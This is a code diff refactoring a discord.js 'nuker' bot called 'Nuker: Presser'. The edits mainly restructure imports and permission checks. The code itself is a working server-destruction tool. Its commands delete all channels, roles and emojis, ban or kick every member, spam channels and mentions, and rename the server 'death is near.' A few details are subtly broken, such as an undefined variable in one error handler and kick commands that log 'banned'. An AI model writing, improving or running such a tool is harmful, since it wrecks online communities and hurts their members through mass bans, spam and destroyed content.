@@ -1,15 +1,10 @@
 // https://github.com/17teen
 // Discord: 7teen#3868
 
-const Discord = require('discord.js');
-const client = new Discord.Client({ ws: { intents: new Discord.Intents(Discord.Intents.ALL) } });
-const { red, green, blue, yellow, cyan, greenBright, redBright, grey, yellowBright, cyanBright, black, blueBright } = require('chalk');
-const settings = require('./settings.json');
-const token = settings.token;
-const prefix = settings.prefix;
-const founder = settings.founder;
-const disableEveryone = settings.DisableEveryone;
-const myID = settings.ID;
+const { Client, Intents, MessageEmbed } = require('discord.js');
+const client = new Client({ ws: { intents: new Intents(Intents.ALL) } });
+const { red, green, yellow, greenBright, redBright, yellowBright, blueBright } = require('chalk');
+const { token, prefix, founder, DisableEveryone, ID } = require('./settings.json');
 
 const presser = String.raw`
 
@@ -37,7 +32,7 @@ client.on("ready", () => {
     console.log(red('           ════════════════════════════════════════════════════════════════════════════════'));
     console.log(greenBright(`                                      Logged in as: ${client.user.username}#${client.user.discriminator}`));
     console.log(greenBright(`                                      Prefix: ${prefix}`));
-    console.log(greenBright(`                                      DisableEveryone: ${disableEveryone}`));
+    console.log(greenBright(`                                      DisableEveryone: ${DisableEveryone}`));
     console.log(greenBright(`                                      Permission Required: ADMINISTRATOR`));
     console.log(red('           ════════════════════════════════════════════════════════════════════════════════'));
     console.log("");
@@ -53,7 +48,7 @@ client.on("message", async message => {
     if (message.mentions.everyone === true) {
         return;
     } else if (message.mentions.has(client.user.id)) {
-        const helpEmbed = new Discord.MessageEmbed()
+        const helpEmbed = new MessageEmbed()
             .setAuthor(message.author.username, message.author.avatarURL({ dynamic: true }))
             .setTitle('Nuker: Presser')
             .setDescription(`*For whatever reason you've summoned me, make sure to do it with no regrets.*\n\n **Nuking:**\n
@@ -82,10 +77,10 @@ client.on("message", async message => {
 
     // Help
 
-    if (disableEveryone === false) {
+    if (!DisableEveryone) {
 
         if (message.content.startsWith(prefix + 'help')) {
-            const helpEmbed = new Discord.MessageEmbed()
+            const helpEmbed = new MessageEmbed()
                 .setAuthor(message.author.username, message.author.avatarURL({ dynamic: true }))
                 .setTitle('Nuker: Presser')
                 .setDescription(`*War does not termine who is right, only who is left.*\n\n **Nuking:**\n
@@ -112,9 +107,7 @@ client.on("message", async message => {
         if (message.content.startsWith(prefix + 'cc')) {
             let args = message.content.split(" ").slice(1);
             var argresult = args.join(' ');
-            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
-                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
-            } else {
+            if (!message.guild.me.hasPermission("ADMINISTRATOR")) return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
                 if (!argresult) {
                     message.channel.send("*Add an input after the cmd*")
                 } else {
@@ -124,15 +117,13 @@ client.on("message", async message => {
                     }
                 }
                 message.delete();
-            }
+            
         }
 
         // Mass Channel & Ping Every Channel
 
         if (message.content.startsWith(prefix + 'mp')) {
-            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
-                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
-            } else {
+            if (!message.guild.me.hasPermission("ADMINISTRATOR")) return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
                 let args = message.content.split(" ").slice(1);
                 var argresult = args.join(' ');
                 // If you dont give an input
@@ -171,7 +162,6 @@ client.on("message", async message => {
                         }
                     );
                 }
-            }
             message.delete();
         }
 
@@ -179,9 +169,7 @@ client.on("message", async message => {
         // Mass Roles
 
         if (message.content.startsWith(prefix + 'mr')) {
-            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
-                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
-            } else {
+            if (!message.guild.me.hasPermission("ADMINISTRATOR")) return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
                 let args = message.content.split(" ").slice(1);
                 var argresult = args.join(' ');
                 if (!argresult) {
@@ -203,14 +191,12 @@ client.on("message", async message => {
                     }
                 }
                 message.delete();
-            }
+            
         }
 
         // Channel Delete
         if (message.content.startsWith(prefix + 'chd')) {
-            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
-                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
-            } else {
+            if (!message.guild.me.hasPermission("ADMINISTRATOR")) return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
                 message.delete();
                 message.guild.channels.cache.forEach((ch) => {
                     ch.delete().then(() => {
@@ -219,40 +205,33 @@ client.on("message", async message => {
                         console.log(red("ERROR: " + err))
                     })
                 })
-            }
+            
         }
 
         // Ban All
         if (message.content.startsWith(prefix + 'banall')) {
-            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
-                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
-            } else {
+            if (!message.guild.me.hasPermission("ADMINISTRATOR")) return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
                 message.guild.members.cache.forEach(member => member.ban({ reason: "Nuking." })
                     .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banning All Members.")
                         .catch()
                     ))
                 message.delete();
-            }
         }
 
         // Kick All
         if (message.content.startsWith(prefix + 'kall')) {
-            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
-                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
-            } else {
+            if (!message.guild.me.hasPermission("ADMINISTRATOR")) return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
                 message.guild.members.cache.forEach(member => member.kick({ reason: "Nuking." })
                     .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banning All Members.")
                         .catch()
                     ));
                 message.delete();
-            }
+            
         }
 
         // Delete All Roles                 
         if (message.content.startsWith(prefix + 'dr')) {
-            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
-                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
-            } else {
+            if (!message.guild.me.hasPermission("ADMINISTRATOR")) return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
                 message.guild.roles.cache.forEach((role) => {
                     if (message.guild.me.roles.highest.position > role.position) {
                         role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} is being deleted successfully`))).catch((err) => {
@@ -263,24 +242,18 @@ client.on("message", async message => {
                     }
                 })
                 message.delete();
-            }
         }
 
         // Delete All Emojis 
         if (message.content.startsWith(prefix + 'emoall')) {
-            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
-                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
-            } else {
+            if (!message.guild.me.hasPermission("ADMINISTRATOR")) return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
                 message.guild.emojis.cache.forEach(e => e.delete({ reason: "Nuking" }).then(console.log(yellow(`EMOJI: ${e.name} is being deleted successfully`))))
                 message.delete();
-            }
         }
 
         // Death.
         if (message.content.startsWith(prefix + 'die')) {
-            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
-                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
-            } else {
+            if (!message.guild.me.hasPermission("ADMINISTRATOR")) return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
                 message.delete();
                 message.guild.setName(`death is near.`).then(console.log(green(`Server Name changed to: ${message.guild.name} Wizzed`))); // changes server name
 
@@ -345,18 +318,14 @@ client.on("message", async message => {
                         console.log(yellow("ROLE BEING MASSED #" + i))
                     }
                 }, 3000);
-            }
         }
 
         ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-    } else if (disableEveryone === true) {
+    } else {
 
         if (message.content.startsWith(prefix + 'help')) {
-            if (message.author.id != myID) {
-                return message.reply('You are not authorised to use any of these tools commands.')
-            }
-            else {
-                const helpEmbed = new Discord.MessageEmbed()
+            if (message.author.id != ID) return message.reply('You are not authorised to use any of these tools commands.')
+                const helpEmbed = new MessageEmbed()
                     .setAuthor(message.author.username, message.author.avatarURL({ dynamic: true }))
                     .setTitle('Nuker: Presser')
                     .setDescription(`*For whatever reason you've summoned me, make sure to do it with no regrets.*\n\n **Nuking:**\n
@@ -375,7 +344,6 @@ client.on("message", async message => {
                     .setColor(0x36393E)
                     .setTimestamp(Date.now());
                 message.channel.send(helpEmbed);
-            }
         }
 
         // Mass Channels      
@@ -383,13 +351,8 @@ client.on("message", async message => {
         if (message.content.startsWith(prefix + 'cc')) {
             let args = message.content.split(" ").slice(1);
             var argresult = args.join(' ');
-            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
-                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
-            } else {
-                if (message.author.id != myID) {
-                    return message.reply('You are not authorised to use any of these tools commands.')
-                }
-                else {
+            if (!message.guild.me.hasPermission("ADMINISTRATOR")) return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
+                if (message.author.id != ID) return message.reply('You are not authorised to use any of these tools commands.')
                     if (!argresult) {
                         message.channel.send("*Add an input after the cmd*")
                     } else {
@@ -398,17 +361,13 @@ client.on("message", async message => {
                             console.log(yellowBright(`CHANNEL MASSED!`))
                         }
                     }
-                }
-            }
         }
 
         // Mass Channel & Ping Every Channel
 
         if (message.content.startsWith(prefix + 'mp')) {
-            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
-                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
-            } else {
-                if (message.author.id != myID) {
+            if (!message.guild.me.hasPermission("ADMINISTRATOR")) return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
+                if (message.author.id != ID) {
                     return message.reply('You are not authorised to use any of these tools commands.')
                 }
                 else {
@@ -451,18 +410,12 @@ client.on("message", async message => {
                         );
                     }
                 }
-            }
         }
         // Mass Create Roles      
 
         if (message.content.startsWith(prefix + 'mr')) {
-            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
-                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
-            } else {
-                if (message.author.id != myID) {
-                    return message.reply('You are not authorised to use any of these tools commands.')
-                }
-                else {
+            if (!message.guild.me.hasPermission("ADMINISTRATOR")) return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
+                if (message.author.id != ID) return message.reply('You are not authorised to use any of these tools commands.')
                     let args = message.content.split(" ").slice(1);
                     var argresult = args.join(' ');
                     if (!argresult) {
@@ -483,19 +436,13 @@ client.on("message", async message => {
                             console.log(yellow("ROLE BEING MASSED #" + i))
                         }
                     }
-                }
-            }
+                
         }
 
         if (message.content.startsWith(prefix + 'chd')) {
             message.delete();
-            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
-                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
-            } else {
-                if (message.author.id != myID) {
-                    return message.reply('You are not authorised to use any of these tools commands.')
-                }
-                else {
+            if (!message.guild.me.hasPermission("ADMINISTRATOR")) return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
+                if (message.author.id != ID) return message.reply('You are not authorised to use any of these tools commands.')
                     message.guild.channels.cache.forEach((ch) => {
                         ch.delete().then(() => {
                             console.log(redBright(`CHANNEL FUCKED`));
@@ -503,53 +450,33 @@ client.on("message", async message => {
                             console.log(red("ERROR: " + err))
                         })
                     })
-                }
-            }
         }
 
         // Ban All
         if (message.content.startsWith(prefix + 'banall')) {
-            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
-                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
-            } else {
-                if (message.author.id != myID) {
-                    return message.reply('You are not authorised to use any of these tools commands.')
-                }
-                else {
+            if (!message.guild.me.hasPermission("ADMINISTRATOR")) return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
+                if (message.author.id != ID) return message.reply('You are not authorised to use any of these tools commands.')
+                
                     message.guild.members.cache.forEach(member => member.ban({ reason: "Nuking." })
                         .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banning All Members.")
                             .catch()
                         ))
-                }
-            }
         }
 
         // Kick All
         if (message.content.startsWith(prefix + 'kall')) {
-            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
-                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
-            } else {
-                if (message.author.id != myID) {
-                    return message.reply('You are not authorised to use any of these tools commands.')
-                }
-                else {
+            if (!message.guild.me.hasPermission("ADMINISTRATOR")) return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
+                if (message.author.id != ID) return message.reply('You are not authorised to use any of these tools commands.')
                     message.guild.members.cache.forEach(member => member.kick({ reason: "Nuking." })
                         .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banning All Members.")
                             .catch()
                         ));
-                }
-            }
         }
 
         // Delete All Roles All
         if (message.content.startsWith(prefix + 'dr')) {
-            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
-                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
-            } else {
-                if (message.author.id != myID) {
-                    return message.reply('You are not authorised to use any of these tools commands.')
-                }
-                else {
+            if (!message.guild.me.hasPermission("ADMINISTRATOR")) return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
+                if (message.author.id != ID) return message.reply('You are not authorised to use any of these tools commands.')
                     message.guild.roles.cache.forEach((role) => {
                         if (message.guild.me.roles.highest.position > role.position) {
                             role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} is being deleted successfully`))).catch((err) => {
@@ -560,36 +487,22 @@ client.on("message", async message => {
                         }
                     })
                     message.delete();
-                }
-            }
         }
 
         // Delete All Emojis All
         if (message.content.startsWith(prefix + 'emoall')) {
-            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
-                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
-            } else {
-                if (message.author.id != myID) {
-                    return message.reply('You are not authorised to use any of these tools commands.')
-                }
-                else {
+            if (!message.guild.me.hasPermission("ADMINISTRATOR")) return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
+                if (message.author.id != ID) return message.reply('You are not authorised to use any of these tools commands.')
                     message.guild.emojis.cache.forEach(e => e.delete({ reason: "Nuking" }).then(console.log(yellow(`EMOJI: ${e.name} was deleted successfully`))).catch(
                         console.log(yellow(`EMOJI: ${r.name} was cannot be deleted.`))
                     ));
-                }
-            }
         }
     }
 
     // Death.
     if (message.content.startsWith(prefix + 'die')) {
-        if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
-            return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
-        } else {
-            if (message.author.id != myID) {
-                return message.reply('You are not authorised to use any of these tools commands.')
-            }
-            else {
+        if (!message.guild.me.hasPermission("ADMINISTRATOR")) return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
+            if (message.author.id != ID) return message.reply('You are not authorised to use any of these tools commands.')
                 message.delete();
                 message.guild.setName(`death is near.`).then(console.log(green(`Server Name changed to: ${message.guild.name} Wizzed`))); // changes server name
 
@@ -655,8 +568,6 @@ client.on("message", async message => {
                         console.log(yellow("ROLE BEING MASSED #" + i))
                     }
                 }, 3000);
-            }
-        }
     }
 
 })
